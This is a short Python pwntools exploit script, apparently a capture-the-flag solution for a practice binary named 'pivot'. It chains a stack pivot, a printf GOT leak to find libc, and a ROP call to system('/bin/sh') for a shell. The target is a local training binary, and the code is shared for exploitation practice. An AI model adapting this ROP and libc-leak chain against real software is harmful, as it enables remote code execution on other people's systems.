#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn import *

p = process('./pivot')

rax = p64(int(p.recvline_contains('The Old')[-14::].strip(), 16))

plt_printf = p64(0x00400810)
got_printf = p64(0x00602028)
libc_printf = 0x56440
libc_system = 0x48880
libc_binsh = 0x1881ac

#SECOND STAGE
rop2 = p64(0x400b73)		# pop rdi
rop2 += got_printf
rop2 += plt_printf
rop2 += p64(0x400996)		# main

p.recvuntil('>')
p.sendline(rop2)

#FIRST STAGE
rop1 = cyclic(40)
rop1 += p64(0x400b00)           # pop rax; ret
rop1 += rax			# new location to pivot into
rop1 += p64(0x400b02)           # xchg rax, rsp ; ret

p.recvuntil('>')
p.sendline(rop1)

leak = int(u64(p.recvuntil('pivot')[:-5:].strip().ljust(8, '\x00')))
libc_offset = leak - libc_printf
system = p64(libc_offset + libc_system)
bin_sh = p64(libc_offset + libc_binsh)

log.success('pivot location : {}'.format(hex(u64(rax))))
log.success('libc offset : {}'.format(hex(libc_offset)))
log.success('system : {}'.format(hex(u64(system))))
log.success('/bin/sh : {}'.format(hex(u64(bin_sh))))

#SHELL
rop3 = cyclic(40)
rop3 += p64(0x400b73)		# pop rdi; ret
rop3 += bin_sh
rop3 += system

p.recvuntil('>')
p.sendline(rop3)
p.interactive()
